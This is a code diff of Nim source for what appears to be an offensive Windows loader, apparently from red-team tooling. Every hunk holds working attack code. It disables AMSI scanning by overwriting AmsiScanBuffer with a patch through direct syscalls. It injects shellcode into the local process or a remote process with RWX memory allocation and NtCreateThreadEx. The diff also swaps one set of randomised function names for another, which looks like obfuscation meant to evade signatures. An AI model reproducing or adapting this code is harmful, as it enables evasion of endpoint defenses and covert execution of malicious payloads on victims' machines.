@@ -100,11 +100,11 @@ when defined patchAmsi:
         when defined amd64:
             when defined verbose:
                 echo "[*] Running in x64 process"
-            const aPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+            let aPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
         elif defined i386:
             when defined verbose:
                 echo "[*] Running in x86 process"
-            const aPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+            let aPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
         var
             amsi: LibHandle
@@ -129,17 +129,17 @@ when defined patchAmsi:
             var op: ULONG
             var pLen = cast[SIZE_T](aPatch.len)
             var sbPageAddr = sbAddr
-            var ret = XnnlWrMywNrFZycU(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
+            var ret = OWMMatfEEuAkFGyd(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
             doAssert ret == 0, "Error executing NtProtectVirtualMemory when setting AMSI protections."
 
             # NtWriteVirtualMemory
             var bytesWritten: SIZE_T
-            ret = HOdIFVAdjQWNamsW(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
+            ret = eodmammwgdehtZKC(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
             
             # NtProtectVirtualMemory
             var t: ULONG
-            ret = XnnlWrMywNrFZycU(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
+            ret = OWMMatfEEuAkFGyd(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
             doAssert ret == 0, "Error executing NtProtectVirtualMemory when restoring AMSI protections."
 
             disabled = true
@@ -200,12 +200,12 @@ when defined(shinject) or defined(patchApiCalls):
             # NtAllocateVirtualMemory
             var sc_size: SIZE_T = cast[SIZE_T](payload.len)
             var dest: LPVOID
-            var ret = CkzEIpXrlBNcxNyG(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+            var ret = nWEpirsdHAHLmkkz(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
             doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
             # NtWriteVirtualMemory
             var bytesWritten: SIZE_T
-            ret = HOdIFVAdjQWNamsW(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
+            ret = eodmammwgdehtZKC(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
 
             when defined verbose:
@@ -233,7 +233,7 @@ when defined remoteShinject:
             # NtOpenProcess, get handle on remote process
             var rHandle: HANDLE
             var roa: OBJECT_ATTRIBUTES
-            var ret = MSxlQNGtaQVDzcXz(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
+            var ret = GALPYIdGzuLQOpTx(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
             doAssert ret == 0, "Error executing NtOpenProcess (remote)."
             when defined verbose:
                 echo "[*] rHandle: ", rHandle
@@ -241,12 +241,12 @@ when defined remoteShinject:
             # NtAllocateVirtualMemory, allocate memory in remote thread
             var rBaseAddr: LPVOID
             var sc_size: SIZE_T = cast[SIZE_T](payload.len)
-            ret = CkzEIpXrlBNcxNyG(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            ret = nWEpirsdHAHLmkkz(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
             # NtWriteVirtualMemory, write payload to remote thread
             var bytesWritten: SIZE_T
-            ret = HOdIFVAdjQWNamsW(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
+            ret = eodmammwgdehtZKC(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
             doAssert ret == 0, "Error executing NtWriteVirtualMemory."
             when defined verbose:
                 echo "[*] NtWriteVirtualMemory: ", ret
@@ -254,13 +254,13 @@ when defined remoteShinject:
 
             # NtCreateThreadEx, execute shellcode from memory region in remote thread
             var tHandle: HANDLE
-            ret = VzJWdBdsTaqTGsey(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
+            ret = MrvSSHuatQxosGly(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
             doAssert ret == 0, "Error executing NtCreateThreadEx."
 
             # NtClose, close the handle
-            ret = FiuxrPXNssolHiEa(rHandle)
+            ret = pCsHHYfYZhNuUXYy(rHandle)
             doAssert ret == 0, "Error executing NtClose (rHandle)."
-            ret = FiuxrPXNssolHiEa(tHandle)
+            ret = pCsHHYfYZhNuUXYy(tHandle)
             doAssert ret == 0, "Error executing NtClose (tHandle)."
     else:
         # Remote shellcode injection using high-level APIs
